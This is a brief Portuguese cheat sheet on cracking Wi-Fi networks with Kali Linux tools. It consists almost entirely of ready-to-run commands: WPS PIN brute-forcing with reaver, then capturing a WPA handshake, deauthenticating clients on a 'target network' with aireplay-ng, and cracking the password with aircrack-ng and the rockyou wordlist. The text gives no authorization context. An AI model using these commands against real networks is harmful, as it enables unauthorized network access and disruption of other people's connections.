# Wifi Hacking -- Kali Linux
### (by Walysson dos Reis)
---------------------
### WPS Cracking com Reaver
* `airmon-ng check kill` - Interrompe processos que estejam utilizando a placa wifi
* `airmon-ng start wlan0` - Coloca a interface wifi wlan0 em modo de monitoramento
* `wash -i wlan0mon` - Ativa descoberta de redes disponivel na interface wlan0mon
* `reaver -i mon0 -c 1 -b 00:00:00:00:00:00 -vv` - Inicie o reaver inserindo interface, canal e bssid da rede alvo
* `reaver -i mon0 -c 1 -b 00:00:00:00:00:00  -vv -L -N -d 15 -T .5 -r 3:15` - Reavear com parâmetros de intervalo opcional

### Hacking Wifi WPA-PSK com Aircrack
* `airmon-ng check kill` - Interrompe processos que estejam utilizando a placa wifi
* `airmon-ng start wlan0` - Coloca a interface wifi wlan0 em modo de monitoramento
* `airodump-ng wlan0mon` - Usado para descoberta de redes disponivel na interface wlan0mon
* `wash -i wlan0mon` - Usado para descoberta de redes disponivel na interface wlan0mon em realação ao WPS
* `airodump-ng --bssid 00:00:00:00:00:00 -c 1 --write ArqCAP wlan0mon` - Inicia o modo de captura da rede alvo 
* `aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon` - Em outro terminal com modo de captura rodando execute para derrubar a rede alvo
* Ao retornar ao terminal de captura verifique se houve captura do pacote se for exibido a mensagem "WPA handshake"
* Com pacote com a senha capturado devemos usar Wordlists para tentar quebrar a senha
* /usr/share/wordlists/rockyou.txt.gz - Wordlist padrão do Kali Linux
* `gzip -d rockyou.txt.gz` - Descompacta o arquivo de wordlist deletando o arquivo zipado
* `aircrack-ng ArqCap-01.cap -w rockyou.txt` - Inicia o processo de teste de senha utilizando o arquivo de wordlist
--------
## Referências
https://outpost24.com/blog/wps-cracking-with-reaver  
https://cienciacomputacao.com.br/tutorial/como-hackear-wi-fi-wpa2-psk-com-kali-linux/  
https://www.cyberpratibha.com/blog/how-do-i-use-rockyou-wordlist-txt-in-kali-linux/  


